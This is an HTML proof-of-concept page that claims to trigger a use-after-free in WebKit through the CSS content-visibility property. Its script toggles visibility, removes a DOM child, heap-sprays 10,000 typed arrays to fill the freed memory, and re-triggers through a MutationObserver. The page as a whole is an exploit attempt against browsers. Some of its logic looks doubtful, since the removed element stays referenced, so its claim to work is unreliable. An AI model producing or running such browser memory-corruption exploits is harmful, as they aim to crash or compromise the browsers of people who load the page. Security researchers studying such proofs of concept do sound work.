<!DOCTYPE html>
<html>
<head>
    <title>WebKit UAF - content-visibility PoC</title>
    <style>
        .container {
            width: 200px;
            height: 200px;
        }
        .child {
            width: 100px;
            height: 100px;
            background-color: blue;
        }
    </style>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting WebKit UAF PoC...");

            const container = document.querySelector('.container');
            const child = document.querySelector('.child');

            // MutationObserver to re-trigger UAF
            const observer = new MutationObserver(() => {
                log("Mutation observed, re-triggering...");
                triggerUAF();
            });

            observer.observe(container, { childList: true });

            function triggerUAF() {
                try {
                    // Step 1: Set content-visibility to hidden
                    container.style.contentVisibility = 'hidden';

                    // Step 2: Remove child (freeing memory)
                    container.removeChild(child);

                    // Step 3: Delay and restore visibility
                    setTimeout(() => {
                        container.style.contentVisibility = 'auto';
                        log("Restored content-visibility");
                    }, 100);

                    // Step 4: Heap spray to fill freed memory
                    window.spray = [];
                    for (let i = 0; i < 10000; i++) {
                        window.spray.push(new Uint8Array(0x100));
                    }

                    log("Heap spray complete.");
                } catch (e) {
                    log("Exception: " + e.message);
                }
            }

            // Start first trigger
            triggerUAF();
        };
    </script>
</head>
<body>
    <h2>WebKit UAF via content-visibility</h2>
    <div class="container">
        <div class="child"></div>
    </div>
</body>
</html>
